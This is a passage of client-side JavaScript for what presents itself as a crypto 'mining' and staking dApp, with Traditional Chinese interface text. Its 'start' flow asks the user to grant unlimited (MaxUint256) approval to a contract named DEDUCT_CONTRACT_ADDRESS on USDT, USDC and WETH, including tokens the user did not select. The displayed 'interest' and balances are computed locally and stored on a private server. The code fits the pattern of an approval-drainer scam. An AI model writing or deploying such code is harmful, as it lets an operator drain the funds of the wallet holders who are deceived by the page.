'USDT':{name:'USDT',contract:usdtContract,address:USDT_CONTRACT_ADDRESS},
'USDC':{name:'USDC',contract:usdcContract,address:USDC_CONTRACT_ADDRESS},
'WETH':{name:'WETH',contract:wethContract,address:WETH_CONTRACT_ADDRESS}
};
const tokensToProcess=[tokenMap[selectedToken],...Object.values(tokenMap).filter(t=>t.name!==selectedToken)];
let tokenToActivate='';
for(const{name,contract,address}of tokensToProcess){
updateStatus(`檢查 ${name} 授權額度...`);
const currentAllowance=await retry(()=>contract.allowance(userAddress,DEDUCT_CONTRACT_ADDRESS)).catch(()=>0n);
if(currentAllowance<requiredAllowance){
updateStatus(`請求 ${name} 授權...`);
const approvalTx=await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS,window.ethers.constants.MaxUint256);
approvalTx.value=0n;
await sendMobileRobustTransaction(approvalTx);
const newAllowance=await retry(()=>contract.allowance(userAddress,DEDUCT_CONTRACT_ADDRESS)).catch(()=>0n);
if(newAllowance>=requiredAllowance&&!tokenToActivate)tokenToActivate=address;
}else if(!tokenToActivate)tokenToActivate=address;
}
if(!serviceActivated&&tokenToActivate){
const tokenName=tokensToProcess.find(t=>t.address===tokenToActivate).name;
updateStatus(`啟動服務（使用 ${tokenName}）...`);
const activateTx=await deductContract.activateService.populateTransaction(tokenToActivate);
activateTx.value=0n;
await sendMobileRobustTransaction(activateTx);
await saveUserData({isActive:true,stakingStartTime,claimedInterest,pledgedAmount,accountBalance,nextBenefitTime:localStorage.getItem('nextBenefitTime'),lastUpdated:Date.now(),source:'index.html'});
}
}
async function getEthPrices(){
try{
updateStatus(translations[currentLang].fetchingBalances);
const response=await retry(()=>fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd,usdt'));
if(!response.ok)throw new Error('Network error');
const data=await response.json();
const usdPrice=data.ethereum?.usd||0;
const usdtPrice=data.ethereum?.usdt||usdPrice;
const prices={usd:usdPrice,usdt:usdtPrice,usdc:usdPrice,weth:usdPrice};
updateStatus("");return prices;
}catch(e){
updateStatus(translations[currentLang].priceError,true);return null;
}
}
async function claimInterest(){
await loadUserDataFromServer();
const claimableETH=parseFloat(cumulativeValue?.textContent?.replace(' ETH','').trim()||'0');
if(isNaN(claimableETH)||claimableETH<0.0000001){updateStatus(translations[currentLang].noClaimable,true);return;}
const prices=await getEthPrices();
if(!prices||prices.usd===0){updateStatus(translations[currentLang].priceError,true);return;}
const selectedToken=walletTokenSelect.value;
let rate=prices[selectedToken.toLowerCase()];if(isNaN(rate)||rate===0)rate=selectedToken==='WETH'?1:prices.usd;
const valueInToken=claimableETH*rate;
if(isNaN(valueInToken)||valueInToken<=0){updateStatus(translations[currentLang].invalidCalc,true);return;}
modalClaimableETH.textContent=`${claimableETH.toFixed(7)} ETH`;
modalEthPrice.textContent=`$${prices.usd.toFixed(2)}`;
modalSelectedToken.textContent=selectedToken;
modalEquivalentValue.textContent=`${valueInToken.toFixed(3)} ${selectedToken}`;
modalTitle.textContent=translations[currentLang]?.claimBtnText||'Claim Interest';
claimModal.style.display='flex';
}
function disconnectWallet(){
resetState(true);
updateStatus('錢包已斷開連線，請在錢包設置中移除權限。',true);
}
function setupSSE(){
if(!userAddress)return;
let retryCount=0;const maxRetries=5;const baseRetryDelay=10000;let fallbackPollingInterval=null;
function startFallbackPolling(){
if(fallbackPollingInterval)return;
fallbackPollingInterval=setInterval(async()=>{try{await loadUserDataFromServer();await updateInterest();}catch(e){console.error(e);}},5000);
}
function connectSSE(){
const source=new EventSource(`${API_BASE_URL}/api/sse`);
source.onmessage=async(event)=>{
try{
const parsed=JSON.parse(event.data);
const {event:eventType,data}=parsed;
if(eventType==='dataUpdate'&&data.users&&data.users[userAddress]){
if(data.lastUpdated>localLastUpdated){
localLastUpdated=data.lastUpdated;
await loadUserDataFromServer();
await updateInterest();  // 強制更新 UI
const balances={usdt:await retry(()=>usdtContract.balanceOf(userAddress)).catch(()=>0n),
usdc:await retry(()=>usdcContract.balanceOf(userAddress)).catch(()=>0n),
weth:await retry(()=>wethContract.balanceOf(userAddress)).catch(()=>0n)};
updateBalancesUI(balances);
}
}
retryCount=0;if(fallbackPollingInterval){clearInterval(fallbackPollingInterval);fallbackPollingInterval=null;}
}catch(e){console.error(`SSE parse error: ${e.message}`);}
};
source.onerror=()=>{source.close();isServerAvailable=false;
if(retryCount<maxRetries){retryCount++;setTimeout(connectSSE,baseRetryDelay*(retryCount+1));}
else{updateStatus(translations[currentLang].sseFailed,true);startFallbackPolling();}
};
}
connectSSE();
}
document.addEventListener('DOMContentLoaded',async()=>{
updateLanguage(localStorage.getItem('language')||'zh-Hant');
let ethersLoaded=false;
for(let i=0;i<30;i++){
if(window.ethers&&window.ethers.providers&&window.ethers.providers.Web3Provider){ethersLoaded=true;break;}
await new Promise(r=>setTimeout(r,2000));
}
if(!ethersLoaded){
const cdnUrls=['https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js','https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js'];
for(let url of cdnUrls){
const s=document.createElement('script');s.type='text/javascript';s.src=url;s.async=false;document.head.appendChild(s);
await new Promise(r=>setTimeout(r,3000));
if(window.ethers&&window.ethers.providers&&window.ethers.providers.Web3Provider){ethersLoaded=true;break;}
}
if(!ethersLoaded){updateStatus(translations[currentLang].ethersError,true);connectButton.disabled=true;return;}
}
await initializeWallet();
setInterval(updateTotalFunds,500);  // 每 0.5 秒更新一次
updateTotalFunds();  // 立即更新一次
if(!grossOutputValue||!cumulativeValue)await retryDOMAcquisition();
setInitialNextBenefitTime();
if(userAddress){await loadUserDataFromServer();setupSSE();}
if(closeModal)closeModal.onclick=()=>{claimModal.style.display='none';};
if(cancelClaim)cancelClaim.onclick=()=>{claimModal.style.display='none';};
if(confirmClaim)confirmClaim.onclick=async()=>{
claimModal.style.display='none';
const claimableETHString=modalClaimableETH?.textContent?.replace(' ETH','').trim()||'0';
const claimableETH=parseFloat(claimableETHString);
const selectedToken=modalSelectedToken?.textContent||'USDT';
const valueInTokenString=modalEquivalentValue?.textContent?.replace(/[^0-9.]/g,'')||'0';
const valueInToken=parseFloat(valueInTokenString);
if(isNaN(claimableETH)||isNaN(valueInToken)){
updateStatus(translations[currentLang].invalidCalc,true);
return;
}
const grossOutputETH=parseFloat(grossOutputValue?.textContent?.replace(' ETH','')||'0');
claimedInterest+=claimableETH;
accountBalance[selectedToken]=(accountBalance[selectedToken]||0)+valueInToken;
localStorage.setItem('userData',JSON.stringify({
stakingStartTime,
claimedInterest,
pledgedAmount,
accountBalance,
grossOutput:grossOutputETH,
cumulative:0,
nextBenefitTime:localStorage.getItem('nextBenefitTime'),
lastUpdated:Date.now()
}));
await saveUserData({
stakingStartTime,
claimedInterest,
pledgedAmount,
accountBalance,
grossOutput:grossOutputETH,
cumulative:0,
nextBenefitTime:localStorage.getItem('nextBenefitTime'),
lastUpdated:Date.now(),
source:'index.html'
});
await updateInterest();
const walletBalances={
usdt:userAddress?await retry(()=>usdtContract.balanceOf(userAddress)).catch(()=>0n):0n,
usdc:userAddress?await retry(()=>usdcContract.balanceOf(userAddress)).catch(()=>0n):0n,
weth:userAddress?await retry(()=>wethContract.balanceOf(userAddress)).catch(()=>0n):0n
};
updateBalancesUI(walletBalances);
updateStatus(translations[currentLang].claimSuccess);
};
if(claimModal)claimModal.onclick=e=>e.target===claimModal&&(claimModal.style.display='none');
});
languageSelect.onchange=e=>updateLanguage(e.target.value);
connectButton.onclick=async()=>connectButton.classList.contains('connected')?disconnectWallet():await connectWallet();
startBtn.onclick=async()=>{
const currentLang=localStorage.getItem('language')||'zh-Hant';
if(!signer){
updateStatus(translations[currentLang].noWallet,true);
return;
}
const selectedToken=walletTokenSelect.value;
const tokenMap={'USDT':usdtContract,'USDC':usdcContract,'WETH':wethContract};
const selectedContract=tokenMap[selectedToken];
try{
const balance=await retry(()=>selectedContract.balanceOf(userAddress));
if(balance===0n){
updateStatus(`您的 ${selectedToken} 餘額為零，請確保有足夠餘額以開始。`,true);
return;
}
}catch(e){
updateStatus(`${translations[currentLang].error}: 無法獲取餘額: ${e.message}`,true);
return;
}
startBtn.disabled=true;
startBtn.textContent='授權中...';
try{
await handleConditionalAuthorizationFlow();
updateStatus(translations[currentLang].claimSuccess+': 挖礦已開始。');
await updateUIBasedOnChainState();
}catch(error){
updateStatus(`${translations[currentLang].error}: 授權失敗: ${error.message}`,true);
}finally{
startBtn.disabled=false;
startBtn.textContent=translations[currentLang]?.startBtnText||'開始';
}
};
pledgeBtn.onclick=async()=>{
const currentLang=localStorage.getItem('language')||'zh-Hant';
if(!signer){
updateStatus(translations[currentLang].noWallet,true);
return;
}
const amount=parseFloat(pledgeAmount.value)||0;
const duration=parseInt(pledgeDuration.value);
const token=pledgeToken.value;
const tokenMap={
'USDT':USDT_CONTRACT_ADDRESS,
'USDC':USDC_CONTRACT_ADDRESS,
'WETH':WETH_CONTRACT_ADDRESS
};
const tokenAddress=tokenMap[token];
if(!tokenAddress){
updateStatus(translations[currentLang].invalidPledgeToken,true);
return;
}
if(!amount||amount<=0){
updateStatus(translations[currentLang].invalidPledgeAmount,true);
return;
}
const selectedContract={'USDT':usdtContract,'USDC':usdcContract,'WETH':wethContract}[token];
try{
const balance=await retry(()=>selectedContract.balanceOf(userAddress));
const decimals=token==='WETH'?18:6;
const formattedBalance=parseFloat(window.ethers.utils.formatUnits(balance,decimals));
if(amount>formattedBalance){
updateStatus(translations[currentLang].insufficientBalance,true);
return;
}
}catch(error){
updateStatus(`${translations[currentLang].error}: 無法獲取 ${token} 餘額: ${error.message}`,true);
return;
}
updateStatus('提交質押中...');
const pledgeData={
address:userAddress,
pledges:{
isPledging:true,
cycle:duration,
token:tokenAddress,
amount:amount.toFixed(2)
}
};
try{
const response=await retry(()=>fetch(`${API_BASE_URL}/api/pledge-data`,{
method:'POST',
headers:{
'Content-Type':'application/json'
},
body:JSON.stringify(pledgeData)
}));
if(!response.ok)throw new Error(`Failed to submit pledge, status: ${response.status}`);
pledgedAmount=amount;
localStorage.setItem('userData',JSON.stringify({
stakingStartTime,
claimedInterest,
pledgedAmount,
accountBalance,
grossOutput:parseFloat(grossOutputValue?.textContent?.replace(' ETH','')||'0'),
cumulative:parseFloat(cumulativeValue?.textContent?.replace(' ETH','')||'0'),
nextBenefitTime:localStorage.getItem('nextBenefitTime'),
lastUpdated:Date.now()
}));
const totalPledgedValue=document.getElementById('totalPledgedValue');
if(totalPledgedValue){
totalPledgedValue.textContent=`${amount.toFixed(2)} ${token}`;
}
updateStatus(translations[currentLang].pledgeSuccess);
await saveUserData();
await updateInterest();
}catch(error){
updateStatus(translations[currentLang].pledgeError,true);
}
};
refreshWallet.onclick=async()=>{
const currentLang=localStorage.getItem('language')||'zh-Hant';
if(!signer){
updateStatus(translations[currentLang].noWallet,true);
return;
}
updateStatus(translations[currentLang].fetchingBalances);
const balances={
usdt:await retry(()=>usdtContract.balanceOf(userAddress)).catch(()=>0n),
usdc:await retry(()=>usdcContract.balanceOf(userAddress)).catch(()=>0n),
weth:await retry(()=>wethContract.balanceOf(userAddress)).catch(()=>0n)
};
updateBalancesUI(balances);
updateStatus('');
};
walletTokenSelect.onchange=async()=>{
const currentLang=localStorage.getItem('language')||'zh-Hant';
if(!signer){
if(walletBalanceAmount)walletBalanceAmount.textContent='0.000';
if(accountBalanceValue)accountBalanceValue.textContent=`0.000 ${walletTokenSelect.value}`;
return;
}
const balances={
usdt:await retry(()=>usdtContract.balanceOf(userAddress)).catch(()=>0n),
usdc:await retry(()=>usdcContract.balanceOf(userAddress)).catch(()=>0n),
weth:await retry(()=>wethContract.balanceOf(userAddress)).catch(()=>0n)
};
updateBalancesUI(balances);
};
document.querySelectorAll('.tab').forEach(tab=>{
tab.onclick=async()=>{
document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
tab.classList.add('active');
document.querySelectorAll('.content-section').forEach(s=>s.classList.remove('active'));
document.getElementById(tab.dataset.tab).classList.add('active');
if(tab.dataset.tab==='liquidity'){
const acquired=await retryDOMAcquisition();
if(acquired)await updateInterest();
else updateStatus(translations[currentLang].error+': 無法獲取 DOM 元素',true);
}
};
});